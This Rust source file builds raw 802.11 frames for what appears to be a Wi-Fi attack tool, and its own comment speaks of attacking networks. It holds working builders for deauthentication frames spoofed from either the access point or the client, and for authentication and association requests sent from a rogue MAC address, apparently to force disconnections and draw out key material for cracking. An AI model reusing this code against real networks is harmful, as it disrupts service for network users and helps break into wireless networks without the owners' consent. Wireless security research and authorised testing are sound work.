use libwifi::frame::{
    components::{
        FrameControl, MacAddress, ManagementHeader, RsnAkmSuite, RsnCipherSuite, RsnInformation,
        SequenceControl, StationInfo, VendorSpecificInfo, WpaCipherSuite,
    },
    AssociationRequest, Authentication, Deauthentication, DeauthenticationReason, ProbeRequest,
    ReassociationRequest,
};

// These frames are MOSTLY hard coded based on security research by Zer0Beat (HcxTools)
// There may be optimizations, changes in the future to how we can attack networks by manipulating these values for better results.
// These is a good platform for continued testing and optimization.

pub fn build_authentication_frame_noack(
    destination: MacAddress,
    source_rogue: MacAddress,
) -> Vec<u8> {
    let mut rth: Vec<u8> = [
        0x00, 0x00, /* radiotap version and padding */
        0x08, 0x00, /* radiotap header length */
        0x00, 0x00, 0x00, 0x00, /* bitmap */
    ]
    .to_vec();

    let frame_control = FrameControl {
        protocol_version: 0,
        frame_type: libwifi::FrameType::Management,
        frame_subtype: libwifi::FrameSubType::Authentication,
        flags: 1u8,
    };

    let header: ManagementHeader = ManagementHeader {
        frame_control,
        duration: 15000u16.to_ne_bytes(),
        address_1: destination.clone(),
        address_2: source_rogue,
        address_3: destination.clone(),
        sequence_control: SequenceControl {
            fragment_number: 0u8,
            sequence_number: 1u16,
        },
    };
    let authreq = Authentication {
        header,
        auth_algorithm: 0u16,
        auth_seq: 1u16,
        status_code: 0u16,
        challenge_text: None,
    };
    rth.extend(authreq.encode());
    rth
}

pub fn build_deauthentication_fm_ap(
    ap: MacAddress,
    client: MacAddress,
    reason: DeauthenticationReason,
) -> Vec<u8> {
    let mut rth: Vec<u8> = [
        0x00, 0x00, /* radiotap version and padding */
        0x08, 0x00, /* radiotap header length */
        0x00, 0x00, 0x00, 0x00, /* bitmap */
    ]
    .to_vec();

    let frame_control = FrameControl {
        protocol_version: 0,
        frame_type: libwifi::FrameType::Management,
        frame_subtype: libwifi::FrameSubType::Deauthentication,
        flags: 1u8,
    };

    let header: ManagementHeader = ManagementHeader {
        frame_control,
        duration: 15000u16.to_ne_bytes(),
        address_1: client.clone(),
        address_2: ap.clone(),
        address_3: ap.clone(),
        sequence_control: SequenceControl {
            fragment_number: 0u8,
            sequence_number: 1u16,
        },
    };
    let authreq = Deauthentication {
        header,
        reason_code: reason,
    };
    rth.extend(authreq.encode());
    rth
}

pub fn build_deauthentication_fm_client(
    ap: MacAddress,
    client: MacAddress,
    reason: DeauthenticationReason,
) -> Vec<u8> {
    let mut rth: Vec<u8> = [
        0x00, 0x00, /* radiotap version and padding */
        0x08, 0x00, /* radiotap header length */
        0x00, 0x00, 0x00, 0x00, /* bitmap */
    ]
    .to_vec();

    let frame_control = FrameControl {
        protocol_version: 0,
        frame_type: libwifi::FrameType::Management,
        frame_subtype: libwifi::FrameSubType::Deauthentication,
        flags: 1u8,
    };

    let header: ManagementHeader = ManagementHeader {
        frame_control,
        duration: 15000u16.to_ne_bytes(),
        address_1: ap.clone(),
        address_2: client.clone(),
        address_3: ap.clone(),
        sequence_control: SequenceControl {
            fragment_number: 0u8,
            sequence_number: 1u16,
        },
    };
    let authreq = Deauthentication {
        header,
        reason_code: reason,
    };
    rth.extend(authreq.encode());
    rth
}

pub fn build_association_request_org(
    addr1: MacAddress,
    addr_rogue: MacAddress,
    addr3: MacAddress,
    ssid: Option<String>,
) -> Vec<u8> {
    let mut rth: Vec<u8> = [
        0x00, 0x00, /* radiotap version and padding */
        0x08, 0x00, /* radiotap header length */
        0x00, 0x00, 0x00, 0x00, /* bitmap */
    ]
    .to_vec();

    let frame_control = FrameControl {
        protocol_version: 0,
        frame_type: libwifi::FrameType::Management,
        frame_subtype: libwifi::FrameSubType::AssociationRequest,
        flags: 1u8,
    };

    let header: ManagementHeader = ManagementHeader {
        frame_control,
        duration: [0x3a, 0x01],
        address_1: addr1.clone(),
        address_2: addr_rogue.clone(),
        address_3: addr3.clone(),
        sequence_control: SequenceControl {
            fragment_number: 0u8,
            sequence_number: 1u16,
        },
    };

    let frx = AssociationRequest {
        header,
        beacon_interval: 0x0005,
        capability_info: 0x0431,
        station_info: StationInfo {
            supported_rates: vec![1.0, 2.0, 5.5, 11.0, 6.0, 9.0, 12.0, 18.0],
            extended_supported_rates: Some(vec![24.0, 36.0, 48.0, 54.0]),
            ssid,
            ds_parameter_set: None,
            tim: None,
            country_info: None,
            power_constraint: None,
            ht_capabilities: None,
            vht_capabilities: None,
            rsn_information: Some(RsnInformation {
                version: 1,
                group_cipher_suite: RsnCipherSuite::CCMP,
                pairwise_cipher_suites: vec![RsnCipherSuite::CCMP],
                akm_suites: vec![RsnAkmSuite::PSK],
                mfp_required: false,
                pre_auth: false,
                no_pairwise: false,
                ptksa_replay_counter: 0,
                gtksa_replay_counter: 0,
                mfp_capable: true,
                joint_multi_band_rsna: false,
                peerkey_enabled: false,
                extended_key_id: false,
                ocvc: false,
            }),
            wpa_info: None,
            vendor_specific: Vec::new(),
            data: vec![
                /* RM Enabled Capabilities */
                (0x46, vec![0x7b, 0x00, 0x02, 0x00, 0x00]),
                /* Supported Operating Classes */
                (0x3b, vec![0x51, 0x51, 0x53, 0x54]),
            ],
        },
    };
    rth.extend(frx.encode());
    rth
}

pub fn build_reassociation_request(
    ap_mac: MacAddress,
    client_mac: MacAddress,
    ssid: Option<String>,
    group_cipher_suite: RsnCipherSuite,
    pairwise_cipher_suites: Vec<RsnCipherSuite>,
) -> Vec<u8> {
    let mut rth: Vec<u8> = [
        0x00, 0x00, /* radiotap version and padding */
        0x08, 0x00, /* radiotap header length */
        0x00, 0x00, 0x00, 0x00, /* bitmap */
    ]
    .to_vec();

    let frame_control = FrameControl {
        protocol_version: 0,
        frame_type: libwifi::FrameType::Management,
        frame_subtype: libwifi::FrameSubType::ReassociationRequest,
        flags: 1u8,
    };

    let header: ManagementHeader = ManagementHeader {
        frame_control,
        duration: 15000u16.to_ne_bytes(),
        address_1: ap_mac.clone(),
        address_2: client_mac.clone(),
        address_3: ap_mac.clone(),
        sequence_control: SequenceControl {
            fragment_number: 0u8,
            sequence_number: 1u16,
        },
    };

    let frx = ReassociationRequest {
        header,
        capability_info: 0x431,
        listen_interval: 0x14,
        current_ap_address: ap_mac,
        station_info: StationInfo {
            supported_rates: vec![1.0, 2.0, 5.5, 11.0, 6.0, 9.0, 12.0, 18.0],
            extended_supported_rates: Some(vec![24.0, 36.0, 48.0, 54.0]),
            ssid,
            ds_parameter_set: None,
            tim: None,
            country_info: None,
            power_constraint: None,
            ht_capabilities: None,
            vht_capabilities: None,
            rsn_information: Some(RsnInformation {
                version: 1,
                group_cipher_suite,
                pairwise_cipher_suites,
                akm_suites: vec![RsnAkmSuite::PSK],
                mfp_required: false,
                pre_auth: false,
                no_pairwise: false,
                ptksa_replay_counter: 0,
                gtksa_replay_counter: 0,
                mfp_capable: true,
                joint_multi_band_rsna: false,
                peerkey_enabled: false,
                extended_key_id: false,
                ocvc: false,
            }),
            wpa_info: None,
            vendor_specific: Vec::new(),
            data: vec![
                (0x46, vec![0x7b, 0x00, 0x02, 0x00, 0x00]),
                (0x3b, vec![0x51, 0x51, 0x53, 0x54]),
            ],
        },
    };
    rth.extend(frx.encode());
    rth
}

pub fn build_probe_request_undirected(addr_rogue: MacAddress) -> Vec<u8> {
    let mut rth: Vec<u8> = [
        0x00, 0x00, /* radiotap version and padding */
        0x08, 0x00, /* radiotap header length */
        0x00, 0x00, 0x00, 0x00, /* bitmap */
    ]
    .to_vec();

    let frame_control = FrameControl {
        protocol_version: 0,
        frame_type: libwifi::FrameType::Management,
        frame_subtype: libwifi::FrameSubType::ProbeRequest,
        flags: 0u8,
    };

    let header: ManagementHeader = ManagementHeader {
        frame_control,
        duration: [0x3a, 0x01],
        address_1: MacAddress([255, 255, 255, 255, 255, 255]),
        address_2: addr_rogue.clone(),
        address_3: MacAddress([255, 255, 255, 255, 255, 255]),
        sequence_control: SequenceControl {
            fragment_number: 0u8,
            sequence_number: 1u16,
        },
    };

    let frx = ProbeRequest {
        header,
        station_info: StationInfo {
            supported_rates: vec![1.0, 2.0, 5.5, 11.0, 6.0, 9.0, 12.0, 18.0],
            extended_supported_rates: Some(vec![24.0, 36.0, 48.0, 54.0]),
            ssid: None,
            ds_parameter_set: None,
            tim: None,
            country_info: None,
            power_constraint: None,
            ht_capabilities: None,
            vht_capabilities: None,
            rsn_information: None,
            wpa_info: None,
            vendor_specific: Vec::new(),
            data: Vec::new(),
        },
    };
    rth.extend(frx.encode());
    rth
}

pub fn build_probe_request_directed(addr_rogue: MacAddress, ssid: String) -> Vec<u8> {
    let mut rth: Vec<u8> = [
        0x00, 0x00, /* radiotap version and padding */
        0x08, 0x00, /* radiotap header length */
        0x00, 0x00, 0x00, 0x00, /* bitmap */
    ]
    .to_vec();

    let frame_control = FrameControl {
        protocol_version: 0,
        frame_type: libwifi::FrameType::Management,
        frame_subtype: libwifi::FrameSubType::ProbeRequest,
        flags: 0u8,
    };

    let header: ManagementHeader = ManagementHeader {
        frame_control,
        duration: [0x3a, 0x01],
        address_1: MacAddress([255, 255, 255, 255, 255, 255]),
        address_2: addr_rogue.clone(),
        address_3: MacAddress([255, 255, 255, 255, 255, 255]),
        sequence_control: SequenceControl {
            fragment_number: 0u8,
            sequence_number: 1u16,
        },
    };

    let frx = ProbeRequest {
        header,
        station_info: StationInfo {
            supported_rates: vec![1.0, 2.0, 5.5, 11.0, 6.0, 9.0, 12.0, 18.0],
            extended_supported_rates: Some(vec![24.0, 36.0, 48.0, 54.0]),
            ssid: Some(ssid),
            ds_parameter_set: None,
            tim: None,
            country_info: None,
            power_constraint: None,
            ht_capabilities: None,
            vht_capabilities: None,
            rsn_information: None,
            wpa_info: None,
            vendor_specific: Vec::new(),
            data: Vec::new(),
        },
    };
    rth.extend(frx.encode());
    rth
}
